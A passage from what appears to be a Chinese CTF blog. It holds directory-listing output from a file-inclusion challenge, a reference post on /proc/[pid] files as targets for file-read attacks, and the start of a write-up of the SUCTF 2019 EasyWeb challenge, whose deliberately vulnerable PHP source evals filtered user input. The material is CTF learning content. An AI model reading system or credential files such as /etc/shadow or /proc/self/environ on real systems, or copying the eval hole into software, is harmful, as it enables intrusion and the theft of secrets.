&quot;mtab&quot;</span><br><span class="line">  [67]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;mysql&quot;</span><br><span class="line">  [68]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;networks&quot;</span><br><span class="line">  [69]&#x3D;&gt;</span><br><span class="line">  string(13) &quot;nsswitch.conf&quot;</span><br><span class="line">  [70]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;opt&quot;</span><br><span class="line">  [71]&#x3D;&gt;</span><br><span class="line">  string(10) &quot;os-release&quot;</span><br><span class="line">  [72]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;pam.conf&quot;</span><br><span class="line">  [73]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;pam.d&quot;</span><br><span class="line">  [74]&#x3D;&gt;</span><br><span class="line">  string(6) &quot;passwd&quot;</span><br><span class="line">  [75]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;passwd-&quot;</span><br><span class="line">  [76]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;perl&quot;</span><br><span class="line">  [77]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;php&quot;</span><br><span class="line">  [78]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;profile&quot;</span><br><span class="line">  [79]&#x3D;&gt;</span><br><span class="line">  string(9) &quot;profile.d&quot;</span><br><span class="line">  [80]&#x3D;&gt;</span><br><span class="line">  string(9) &quot;python3.8&quot;</span><br><span class="line">  [81]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;rc.local&quot;</span><br><span class="line">  [82]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;rc0.d&quot;</span><br><span class="line">  [83]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;rc1.d&quot;</span><br><span class="line">  [84]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;rc2.d&quot;</span><br><span class="line">  [85]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;rc3.d&quot;</span><br><span class="line">  [86]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;rc4.d&quot;</span><br><span class="line">  [87]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;rc5.d&quot;</span><br><span class="line">  [88]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;rc6.d&quot;</span><br><span class="line">  [89]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;rcS.d&quot;</span><br><span class="line">  [90]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;resolv.conf&quot;</span><br><span class="line">  [91]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;rmt&quot;</span><br><span class="line">  [92]&#x3D;&gt;</span><br><span class="line">  string(9) &quot;securetty&quot;</span><br><span class="line">  [93]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;security&quot;</span><br><span class="line">  [94]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;selinux&quot;</span><br><span class="line">  [95]&#x3D;&gt;</span><br><span class="line">  string(6) &quot;shadow&quot;</span><br><span class="line">  [96]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;shadow-&quot;</span><br><span class="line">  [97]&#x3D;&gt;</span><br><span class="line">  string(6) &quot;shells&quot;</span><br><span class="line">  [98]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;skel&quot;</span><br><span class="line">  [99]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;ssl&quot;</span><br><span class="line">  [100]&#x3D;&gt;</span><br><span class="line">  string(6) &quot;subgid&quot;</span><br><span class="line">  [101]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;subgid-&quot;</span><br><span class="line">  [102]&#x3D;&gt;</span><br><span class="line">  string(6) &quot;subuid&quot;</span><br><span class="line">  [103]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;subuid-&quot;</span><br><span class="line">  [104]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;sysctl.conf&quot;</span><br><span class="line">  [105]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;sysctl.d&quot;</span><br><span class="line">  [106]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;systemd&quot;</span><br><span class="line">  [107]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;terminfo&quot;</span><br><span class="line">  [108]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;timezone&quot;</span><br><span class="line">  [109]&#x3D;&gt;</span><br><span class="line">  string(10) &quot;tmpfiles.d&quot;</span><br><span class="line">  [110]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;ucf.conf&quot;</span><br><span class="line">  [111]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;udev&quot;</span><br><span class="line">  [112]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;ufw&quot;</span><br><span class="line">  [113]&#x3D;&gt;</span><br><span class="line">  string(13) &quot;update-motd.d&quot;</span><br><span class="line">  [114]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;vim&quot;</span><br><span class="line">  [115]&#x3D;&gt;</span><br><span class="line">  string(6) &quot;wgetrc&quot;</span><br><span class="line">  [116]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;xdg&quot;</span><br><span class="line">&#125;</span><br><span class="line">​&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line">​&#96;&#96;&#96;</span><br><span class="line"> [0]&#x3D;&gt;</span><br><span class="line">  string(1) &quot;.&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;..&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(10) &quot;egdcbahfbh&quot;</span><br><span class="line">​&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line">​&#96;&#96;&#96;</span><br><span class="line">dedhfgiaai</span><br><span class="line">​&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line">​&#96;&#96;&#96;</span><br><span class="line"> [0]&#x3D;&gt;</span><br><span class="line">  string(1) &quot;.&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;..&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(10) &quot;aeebhaaejd&quot;</span><br><span class="line">&#125;</span><br><span class="line">​&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>获得如上目录，并在最后的一个目录下发现了fl44444g，然后直接文件包含即可<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210516005105.png" alt="img" style="zoom:67%;"></p>
]]></content>
  </entry>
  <entry>
    <title>CTF中linux重要文件目录小结（文件读取）</title>
    <url>/2021/05/28/CTF%E4%B8%ADlinux%E9%87%8D%E8%A6%81%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E5%B0%8F%E7%BB%93%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%89/</url>
    <content><![CDATA[<p>最近发现读取目录也是需要积累的 所以在这里总结一下:</p>
<h2 id="proc-pid"><a href="#proc-pid" class="headerlink" title="/proc/[pid]/"></a>/proc/[pid]/</h2><p>Linux 内核提供了一种通过 proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc 文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。</p>
<p>用户和应用程序可以通过 proc 得到系统的信息，并可以改变内核的某些参数。由于系统的信息，如进程，是动态改变的，所以用户或应用程序读取 proc 文件时，proc 文件系统是动态从系统内核读出所需信息并提交的。</p>
<p>下面列出的这些文件或子文件夹，并不是都是在你的系统中存在，这取决于你的内核配置和装载的模块。另外，在 proc 下还有三个很重要的目录：net，scsi 和 sys。 sys 目录是可写的，可以通过它来访问或修改内核的参数，而 net 和 scsi 则依赖于内核配置。例如，如果系统不支持 scsi，则 scsi 目录不存在。</p>
<p>除了以上介绍的这些，还有的是一些以数字命名的目录，它们是进程目录。系统中当前运行的每一个进程都有对应的一个目录在 proc 下，以进程的 PID 号为目录名，它们是读取进程信息的接口。而 self 目录则是读取进程本身的信息接口，是一个 link。</p>
<h3 id="proc-pid-auxv"><a href="#proc-pid-auxv" class="headerlink" title="/proc/[pid]/auxv"></a>/proc/[pid]/auxv</h3><p>/proc/[pid]/auxv 包含传递给进程的 ELF 解释器信息，格式是每一项都是一个 unsigned long长度的 ID 加上一个 unsigned long 长度的值。最后一项以连续的两个 0x00 开头。举例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexdump -x &#x2F;proc&#x2F;2406&#x2F;auxv</span><br><span class="line"></span><br><span class="line">0000000    0021    0000    0000    0000    f000    f7fa    7fff    0000</span><br><span class="line">0000010    0010    0000    0000    0000    fbff    1f8b    0000    0000</span><br><span class="line">0000020    0006    0000    0000    0000    1000    0000    0000    0000</span><br><span class="line">0000030    0011    0000    0000    0000    0064    0000    0000    0000</span><br><span class="line">0000040    0003    0000    0000    0000    0040    0040    0000    0000</span><br><span class="line">0000050    0004    0000    0000    0000    0038    0000    0000    0000</span><br><span class="line">0000060    0005    0000    0000    0000    0007    0000    0000    0000</span><br><span class="line">0000070    0007    0000    0000    0000    0000    0000    0000    0000</span><br><span class="line">0000080    0008    0000    0000    0000    0000    0000    0000    0000</span><br><span class="line">0000090    0009    0000    0000    0000    55e0    0045    0000    0000</span><br><span class="line">00000a0    000b    0000    0000    0000    0000    0000    0000    0000</span><br><span class="line">00000b0    000c    0000    0000    0000    0000    0000    0000    0000</span><br><span class="line">00000c0    000d    0000    0000    0000    0000    0000    0000    0000</span><br><span class="line">00000d0    000e    0000    0000    0000    0000    0000    0000    0000</span><br><span class="line">00000e0    0017    0000    0000    0000    0000    0000    0000    0000</span><br><span class="line">00000f0    0019    0000    0000    0000    f079    f7f6    7fff    0000</span><br><span class="line">0000100    001f    0000    0000    0000    ffea    f7f6    7fff    0000</span><br><span class="line">0000110    000f    0000    0000    0000    f089    f7f6    7fff    0000</span><br><span class="line">0000120    0000    0000    0000    0000    0000    0000    0000    0000</span><br><span class="line">0000130</span><br></pre></td></tr></table></figure>

<h3 id="proc-pid-cmdline"><a href="#proc-pid-cmdline" class="headerlink" title="/proc/[pid]/cmdline"></a>/proc/[pid]/cmdline</h3><p>/proc/[pid]/cmdline 是一个只读文件，包含进程的完整命令行信息。如果该进程已经被交换出内存或者这个进程是 zombie 进程，则这个文件没有任何内容。该文件以空字符 null 而不是换行符作为结束标志。举例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ps aux|grep frps</span><br><span class="line">root      2406  0.1  0.1  54880 10524 ?        Sl   Dec11  21:30 frps -c .&#x2F;frps.ini</span><br><span class="line"></span><br><span class="line">$ cat &#x2F;proc&#x2F;2406&#x2F;cmdline</span><br><span class="line">frps-c.&#x2F;frps.ini</span><br></pre></td></tr></table></figure>

<h3 id="proc-pid-comm"><a href="#proc-pid-comm" class="headerlink" title="/proc/[pid]/comm"></a>/proc/[pid]/comm</h3><p>/proc/[pid]/comm 包含进程的命令名。举例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat &#x2F;proc&#x2F;2406&#x2F;comm</span><br><span class="line">frps</span><br></pre></td></tr></table></figure>

<h3 id="proc-pid-cwd"><a href="#proc-pid-cwd" class="headerlink" title="/proc/[pid]/cwd"></a>/proc/[pid]/cwd</h3><p>/proc/[pid]/cwd 是进程当前工作目录的符号链接。举例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ls -lt &#x2F;proc&#x2F;2406&#x2F;cwd</span><br><span class="line">lrwxrwxrwx 1 root root 0 Dec 12 20:39 &#x2F;proc&#x2F;2406&#x2F;cwd -&gt; &#x2F;home&#x2F;mike&#x2F;frp_0.13.0_linux_amd64</span><br></pre></td></tr></table></figure>

<h3 id="proc-pid-environ"><a href="#proc-pid-environ" class="headerlink" title="/proc/[pid]/environ"></a>/proc/[pid]/environ</h3><p>/proc/[pid]/environ 显示进程的环境变量。举例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ strings &#x2F;proc&#x2F;2406&#x2F;environ</span><br><span class="line"></span><br><span class="line">SUPERVISOR_GROUP_NAME&#x3D;ssh</span><br><span class="line">TERM&#x3D;linux</span><br><span class="line">SUPERVISOR_SERVER_URL&#x3D;unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;supervisor.sock</span><br><span class="line">SUPERVISOR_PROCESS_NAME&#x3D;ssh</span><br><span class="line">RUNLEVEL&#x3D;2</span><br><span class="line">UPSTART_EVENTS&#x3D;runlevel</span><br><span class="line">PREVLEVEL&#x3D;N</span><br><span class="line">PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin</span><br><span class="line">UPSTART_INSTANCE&#x3D;</span><br><span class="line">UPSTART_JOB&#x3D;rc</span><br><span class="line">SUPERVISOR_ENABLED&#x3D;1</span><br><span class="line">runlevel&#x3D;2</span><br><span class="line">PWD&#x3D;&#x2F;</span><br><span class="line">previous&#x3D;N</span><br></pre></td></tr></table></figure>

<h3 id="proc-pid-exe"><a href="#proc-pid-exe" class="headerlink" title="/proc/[pid]/exe"></a>/proc/[pid]/exe</h3><p>/proc/[pid]/exe 为实际运行程序的符号链接。举例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ls -lt &#x2F;proc&#x2F;2406&#x2F;exe</span><br><span class="line">lrwxrwxrwx 1 root root 0 Dec 11 19:00 &#x2F;proc&#x2F;2406&#x2F;exe -&gt; &#x2F;usr&#x2F;bin&#x2F;frps</span><br></pre></td></tr></table></figure>

<h3 id="proc-pid-fd"><a href="#proc-pid-fd" class="headerlink" title="/proc/[pid]/fd"></a>/proc/[pid]/fd</h3><p>/proc/[pid]/fd 是一个目录，包含进程打开文件的情况。举例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ls -lt &#x2F;proc&#x2F;2406&#x2F;fd</span><br><span class="line"></span><br><span class="line">lrwx------ 1 root root 64 Dec 24 09:39 77 -&gt; socket:[44377722]</span><br><span class="line">lrwx------ 1 root root 64 Dec 17 15:07 47 -&gt; socket:[29482617]</span><br><span class="line">lr-x------ 1 root root 64 Dec 12 20:18 0 -&gt; pipe:[13282]</span><br><span class="line">l-wx------ 1 root root 64 Dec 12 20:18 1 -&gt; pipe:[13283]</span><br><span class="line">lrwx------ 1 root root 64 Dec 12 20:18 10 -&gt; socket:[12238218]</span><br><span class="line">lrwx------ 1 root root 64 Dec 12 20:18 4 -&gt; anon_inode:[eventpoll]</span><br><span class="line">lrwx------ 1 root root 64 Dec 12 20:18 40 -&gt; socket:[19378614]</span><br></pre></td></tr></table></figure>

<p>目录中的每一项都是一个符号链接，指向打开的文件，数字则代表文件描述符。</p>
<h3 id="proc-pid-latency"><a href="#proc-pid-latency" class="headerlink" title="/proc/[pid]/latency"></a>/proc/[pid]/latency</h3><p>/proc/[pid]/latency 显示哪些代码造成的延时比较大。如果要使用这个特性需要执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;latencytop</span><br></pre></td></tr></table></figure>

<p>举例如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat &#x2F;proc&#x2F;2406&#x2F;latency</span><br><span class="line"></span><br><span class="line">Latency Top version : v0.1</span><br><span class="line">30667 10650491 4891 poll_schedule_timeout do_sys_poll SyS_poll system_call_fastpath 0x7f636573dc1d</span><br><span class="line">8 105 44 futex_wait_queue_me futex_wait do_futex SyS_futex system_call_fastpath 0x7f6365a167bc</span><br></pre></td></tr></table></figure>

<p>每一行前三个数字分别是后面代码执行的次数、总共执行延迟时间(单位是微秒)和最长执行延迟时间(单位是微秒)。后面则是代码完整的调用栈。</p>
<h3 id="proc-pid-maps"><a href="#proc-pid-maps" class="headerlink" title="/proc/[pid]/maps"></a>/proc/[pid]/maps</h3><p>/proc/[pid]/maps 显示进程的内存区域映射信息。举例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat &#x2F;proc&#x2F;2406&#x2F;maps</span><br><span class="line">00400000-006ea000 r-xp 00000000 fd:01 1727569                            &#x2F;usr&#x2F;bin&#x2F;frps</span><br><span class="line">006ea000-00a6c000 r--p 002ea000 fd:01 1727569                            &#x2F;usr&#x2F;bin&#x2F;frps</span><br><span class="line">00a6c000-00ab1000 rw-p 0066c000 fd:01 1727569                            &#x2F;usr&#x2F;bin&#x2F;frps</span><br><span class="line">00ab1000-00ad4000 rw-p 00000000 00:00 0</span><br><span class="line">c000000000-c00000b000 rw-p 00000000 00:00 0</span><br><span class="line">c41feac000-c420000000 rw-p 00000000 00:00 0</span><br><span class="line">c420000000-c420400000 rw-p 00000000 00:00 0</span><br><span class="line">c420400000-c420700000 rw-p 00000000 00:00 0</span><br><span class="line">c420700000-c420800000 rw-p 00000000 00:00 0</span><br><span class="line">c420800000-c420900000 rw-p 00000000 00:00 0</span><br><span class="line">c420900000-c420a00000 rw-p 00000000 00:00 0</span><br><span class="line">c420a00000-c421ea0000 rw-p 00000000 00:00 0</span><br><span class="line">c421ea0000-c422a00000 rw-p 00000000 00:00 0</span><br><span class="line">c422a00000-c422a60000 rw-p 00000000 00:00 0</span><br><span class="line">7f0418c01000-7f0418ee1000 rw-p 00000000 00:00 0</span><br><span class="line">7ffff7f4f000-7ffff7f70000 rw-p 00000000 00:00 0                          [stack:5121]</span><br><span class="line">7ffff7fad000-7ffff7faf000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">7ffff7faf000-7ffff7fb1000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</span><br></pre></td></tr></table></figure>

<p>其中注意的一点是 [stack:] 是线程的堆栈信息，对应于 /proc/[pid]/task/[tid]/ 路径。</p>
<h3 id="proc-pid-root"><a href="#proc-pid-root" class="headerlink" title="/proc/[pid]/root"></a>/proc/[pid]/root</h3><p>/proc/[pid]/root 是进程根目录的符号链接。举例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$  ls -lt &#x2F;proc&#x2F;2406&#x2F;root</span><br><span class="line">lrwxrwxrwx 1 root root 0 Dec 12 20:39 &#x2F;proc&#x2F;2406&#x2F;root -&gt; &#x2F;</span><br></pre></td></tr></table></figure>

<h3 id="proc-pid-stack"><a href="#proc-pid-stack" class="headerlink" title="/proc/[pid]/stack"></a>/proc/[pid]/stack</h3><p>/proc/[pid]/stack 示当前进程的内核调用栈信息，只有内核编译时打开了 CONFIG_STACKTRACE 编译选项，才会生成这个文件。举例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat &#x2F;proc&#x2F;2406&#x2F;stack</span><br><span class="line">[&lt;ffffffff810fa996&gt;] futex_wait_queue_me+0xc6&#x2F;0x130</span><br><span class="line">[&lt;ffffffff810fb05d&gt;] futex_wait+0x17d&#x2F;0x270</span><br><span class="line">[&lt;ffffffff810fd2d5&gt;] do_futex+0xd5&#x2F;0x520</span><br><span class="line">[&lt;ffffffff810fd791&gt;] SyS_futex+0x71&#x2F;0x150</span><br><span class="line">[&lt;ffffffff8180cc76&gt;] entry_SYSCALL_64_fastpath+0x16&#x2F;0x75</span><br><span class="line">[&lt;ffffffffffffffff&gt;] 0xffffffffffffffff</span><br></pre></td></tr></table></figure>

<h3 id="proc-pid-statm"><a href="#proc-pid-statm" class="headerlink" title="/proc/[pid]/statm"></a>/proc/[pid]/statm</h3><p>/proc/[pid]/statm 显示进程所占用内存大小的统计信息。包含七个值，度量单位是 page(page大小可通过 getconf PAGESIZE 得到)。举例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$  cat &#x2F;proc&#x2F;2406&#x2F;statm  </span><br><span class="line">13720 2617 493 746 0 12007 0</span><br></pre></td></tr></table></figure>

<p>各个值含义：</p>
<blockquote>
<p>a）进程占用的总的内存<br>b）进程当前时刻占用的物理内存<br>c）同其它进程共享的内存<br>d）进程的代码段<br>e）共享库(从2.6版本起，这个值为0)<br>f）进程的堆栈<br>g）dirty pages(从2.6版本起，这个值为0)</p>
</blockquote>
<h3 id="proc-pid-status"><a href="#proc-pid-status" class="headerlink" title="/proc/[pid]/status"></a>/proc/[pid]/status</h3><p>/proc/[pid]/status 包含进程的状态信息。其很多内容与 /proc/[pid]/stat 和 /proc/[pid]/statm 相同，但是却是以一种更清晰地方式展现出来。举例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat &#x2F;proc&#x2F;2406&#x2F;status</span><br><span class="line">Name:	frps</span><br><span class="line">State:	S (sleeping)</span><br><span class="line">Tgid:	2406</span><br><span class="line">Ngid:	0</span><br><span class="line">Pid:	2406</span><br><span class="line">PPid:	2130</span><br><span class="line">TracerPid:	0</span><br><span class="line">Uid:	0	0	0	0</span><br><span class="line">Gid:	0	0	0	0</span><br><span class="line">FDSize:	128</span><br><span class="line">Groups:	0</span><br><span class="line">NStgid:	2406</span><br><span class="line">NSpid:	2406</span><br><span class="line">NSpgid:	2406</span><br><span class="line">NSsid:	2130</span><br><span class="line">VmPeak:	   54880 kB</span><br><span class="line">VmSize:	   54880 kB</span><br><span class="line">VmLck:	       0 kB</span><br><span class="line">VmPin:	       0 kB</span><br><span class="line">VmHWM:	   34872 kB</span><br><span class="line">VmRSS:	   10468 kB</span><br><span class="line">VmData:	   47896 kB</span><br><span class="line">VmStk:	     132 kB</span><br><span class="line">VmExe:	    2984 kB</span><br><span class="line">VmLib:	       0 kB</span><br><span class="line">VmPTE:	      68 kB</span><br><span class="line">VmPMD:	      20 kB</span><br><span class="line">VmSwap:	       0 kB</span><br><span class="line">HugetlbPages:	       0 kB</span><br><span class="line">Threads:	11</span><br><span class="line">SigQ:	0&#x2F;31834</span><br><span class="line">SigPnd:	0000000000000000</span><br><span class="line">ShdPnd:	0000000000000000</span><br><span class="line">SigBlk:	0000000000000000</span><br><span class="line">SigIgn:	0000000000000000</span><br><span class="line">SigCgt:	fffffffe7fc1feff</span><br><span class="line">CapInh:	0000000000000000</span><br><span class="line">CapPrm:	0000003fffffffff</span><br><span class="line">CapEff:	0000003fffffffff</span><br><span class="line">CapBnd:	0000003fffffffff</span><br><span class="line">CapAmb:	0000000000000000</span><br><span class="line">Seccomp:	0</span><br><span class="line">Cpus_allowed:	f</span><br><span class="line">Cpus_allowed_list:	0-3</span><br><span class="line">Mems_allowed:	00000000,00000001</span><br><span class="line">Mems_allowed_list:	0</span><br><span class="line">voluntary_ctxt_switches:	2251028</span><br><span class="line">nonvoluntary_ctxt_switches:	18031</span><br></pre></td></tr></table></figure>

<p>关于信号（signal）的信息：SigQ 分为两部分（例如 0/31834），前面表示当前处在队列中的信号（0），后面则表示队列一共可以存储多少信号（31834）；SigPnd 表示当前线程 pending 的信号，而ShdPnd 则表示整个进程 pending 的信号；SigBlk、SigIgn 和 SigCgt 分别表示对信号的处理是阻塞，忽略，还是捕获。（关于Unix信号的相关知识，可以参考 <a href="https://www.networkworld.com/article/3211296/linux/unix-dealing-with-signals.html">Unix: Dealing with signals</a>）。</p>
<h3 id="proc-pid-syscall"><a href="#proc-pid-syscall" class="headerlink" title="/proc/[pid]/syscall"></a>/proc/[pid]/syscall</h3><p>/proc/[pid]/syscall 显示当前进程正在执行的系统调用。举例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat &#x2F;proc&#x2F;2406&#x2F;syscall</span><br><span class="line">202 0xab3730 0x0 0x0 0x0 0x0 0x0 0x7ffff7f6ec68 0x455bb3</span><br></pre></td></tr></table></figure>

<p>第一个值是系统调用号（202代表poll），后面跟着 6 个系统调用的参数值（位于寄存器中），最后两个值依次是堆栈指针和指令计数器的值。如果当前进程虽然阻塞，但阻塞函数并不是系统调用，则系统调用号的值为 -1，后面只有堆栈指针和指令计数器的值。如果进程没有阻塞，则这个文件只有一个 running 的字符串。</p>
<p>内核编译时打开了 CONFIG_HAVE_ARCH_TRACEHOOK 编译选项，才会生成这个文件。</p>
<h3 id="proc-pid-wchan"><a href="#proc-pid-wchan" class="headerlink" title="/proc/[pid]/wchan"></a>/proc/[pid]/wchan</h3><p>/proc/[pid]/wchan 显示当进程 sleep 时，kernel 当前运行的函数。举例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat &#x2F;proc&#x2F;2406&#x2F;wchan</span><br><span class="line">futex_wait_queue_meadmin</span><br></pre></td></tr></table></figure>

<h3 id="proc-self"><a href="#proc-self" class="headerlink" title="proc/self"></a>proc/self</h3><p>我们都知道可以通过/proc/$pid/来获取指定进程的信息，例如内存映射、CPU绑定信息等等。如果某个进程想要获取本进程的系统信息，就可以通过进程的pid来访问/proc/$pid/目录。但是这个方法还需要获取进程pid，在fork、daemon等情况下pid还可能发生变化。为了更方便的获取本进程的信息，linux提供了/proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于/proc/本进程pid/。进程可以通过访问/proc/self/目录来获取自己的系统信息，而不用每次都获取pid。</p>
<p><strong>所以我们可以通过self获取基于当前应用的不同信息</strong></p>
<p>参考:<a href="https://www.hi-linux.com/posts/64295.html">https://www.hi-linux.com/posts/64295.html</a><br><a href="https://blog.csdn.net/dillanzhou/article/details/82876575">https://blog.csdn.net/dillanzhou/article/details/82876575</a></p>
]]></content>
  </entry>
  <entry>
    <title>buuctf18</title>
    <url>/2021/06/08/buuctf18/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>感觉最近有点小浮躁，必须要尽快调整~脚踏实地才是最重要的</p>
<h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">&quot;upload/tmp_&quot;</span>.md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,$extension)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        $path= $userdir.<span class="string">&quot;/&quot;</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);<span class="comment">//不可以使用超过12种的字符</span></span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>思路:执行eval函数，然后上传文件<br>首先需要绕过那个正则匹配字母数字的，之前使用异或去取字符</p>
